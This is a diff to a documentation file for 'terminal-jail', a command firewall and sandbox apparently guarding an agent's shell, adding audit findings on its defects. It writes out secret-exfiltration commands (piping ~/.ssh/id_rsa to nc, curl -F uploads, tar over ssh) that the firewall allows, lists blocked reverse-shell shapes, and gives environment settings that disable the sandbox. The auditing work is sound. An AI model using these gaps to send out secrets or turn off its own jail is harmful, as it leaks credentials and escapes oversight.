@@ -9,8 +9,12 @@ description: >-
   (TJ-DF-011/012/014 closed — pitfalls below updated to fixed reality),
   refreshed 2026-09-15 (TJ-DF-017 — verify flow branches on FULL/DEGRADED),
   refreshed 2026-09-17 (auto-sandbox dead on DEGRADED hosts; default-allow
-  posture + allow provenance gaps — DF-TERMINAL-JAIL-11..13).
-version: 1.3.0
+  posture + allow provenance gaps — DF-TERMINAL-JAIL-11..13), refreshed
+  2026-09-18 (mapped auto-sandbox cannot read the caller's files — DF-15;
+  allowlist short-circuits egress rules — DF-16; egress-pack coverage gaps —
+  DF-17; probes not jail-aware — DF-18; bunker-las-03 spawn still dead — DF-19;
+  egress MODIFY does not prevent exfiltration — DF-20).
+version: 1.4.0
 category: software-development
 ---
 
@@ -170,15 +174,53 @@ $TJ --user touch /tmp/x   # → COMMAND BLOCKED, rc=126
 
 ## Right-way patterns
 
+- **NEVER trust `modify` on a host where uid mapping works — the mapped
+  auto-sandbox cannot read your own files (2026-09-18, DF-TERMINAL-JAIL-15).**
+  On hosts where `unshare --user --map-users=65534:<subuid>:1 --map-groups=65534:<subgid>:1
+  -S 65534 -G 65534 … true` succeeds (i.e. most real Linux boxes), the engine's
+  auto-sandbox prefix is the MAPPED one and the payload runs as your **subuid**,
+  not as you. Home is `drwx------`, so:
+  `terminal-jail python3 scripts/pidns-capability-probe.py` →
+  `python3: can't open file …: [Errno 13] Permission denied`, rc=2 —
+  the project's own quickstart Step-1 command, through the tool. The engine's
+  preflight (`userns.py::mapped_launch_ok`) only proves the namespace can be
+  created, not that the payload can reach your files. Workarounds (verified):
+  `TERMINAL_JAIL_UID_MAP=0 terminal-jail …` routes to the legacy prefix that
+  works, or `TERMINAL_JAIL_INTERRUPTOR_MODE=disabled`. This host is DEGRADED
+  (mapping denied by AppArmor) so the defect is invisible here — to reproduce
+  you need a host with `/etc/subuid` + no AppArmor userns restriction.
 - **The firewall is deny-list over default-allow (undocumented in prose as
   of 2026-09-17, DF-TERMINAL-JAIL-12)**: unmatched commands are ALLOWED,
   and allow verdicts carry `rule_id: null` — you cannot distinguish an
   allowlist hit from an unexamined command. Design harnesses accordingly
   (pre-filter sensitive reads yourself; don't over-credit an "allow").
+- **An allow verdict with a rule id is an APPROVAL, and it can outrank the
+  network-egress rules (2026-09-18, DF-TERMINAL-JAIL-16)**: the always-allow
+  layer matches before the egress layer, so `cat ~/.ssh/id_rsa | nc host 4444`
+  comes back `allow` / `rule_id=allow-cat-safe`, and `cat <secret> | nc -u host 53`
+  the same. Treat `allow-cat-safe` as "safe to read", never as "safe to wire into
+  a network client".
+- **The egress pack is narrow (DF-TERMINAL-JAIL-17)**: it blocks the reverse-shell
+  shapes (all 11 verified live: `/dev/tcp|/dev/udp` redirects, `nc -e`/`ncat --exec`/`-c`,
+  shell-pipe netcat, the `mkfifo` loop, `socat … EXEC:`, `openssl s_client | sh`,
+  `eval`-wrapped variants) and sandboxes `-T/--upload-file` + `-d/--data*` + `@-`
+  uploads — but `curl -F 'file=@secret' https://…` is a plain ALLOW, as are
+  `nc host < secret`, `dd if=secret | nc`, `tar czf - ~/.ssh | ssh host`, and
+  `python3 -c` socket/`urllib`/`requests` egress. `python3 -c` / `sh -c` are also
+  outside the auto-sandbox set while `python3 file.py` is inside. And a
+  `modify` verdict does NOT prevent the transfer (DF-TERMINAL-JAIL-20): measured
+  with a real collector, `curl -T <secret> http://127.0.0.1:18777/collect` was
+  rewritten to the sandboxed form, exited 0, and the secret arrived (132 bytes).
+  Auto-sandbox = containment; only a `block` stops egress.
 - **`allow-cat-safe` does not actually exclude /etc|/boot|/proc|/sys**
   (DF-TERMINAL-JAIL-13): its negative lookahead can never match those
   paths, so `cat /etc/passwd` is allowed by the default-allow posture, not
   by any rule decision.
+- **Don't classify a host from inside the jail (DF-TERMINAL-JAIL-18)**: run
+  through the CLI, `scripts/pidns-capability-probe.py` → `UNKNOWN: probe timed out
+  after 15s` and `scripts/fs-isolation-probe.py` → `UNKNOWN: probe error: [Errno 22]
+  Invalid argument` on this host, while direct runs correctly report FULL / DEGRADED.
+  Run both probes OUTSIDE the jail.
 - **Blocking test battery**: engine (`intercept`) → bridge (stdin JSON) →
   CLI (only for block box/exit codes). Never run the dangerous commands
   themselves — the bridge is the safe oracle.
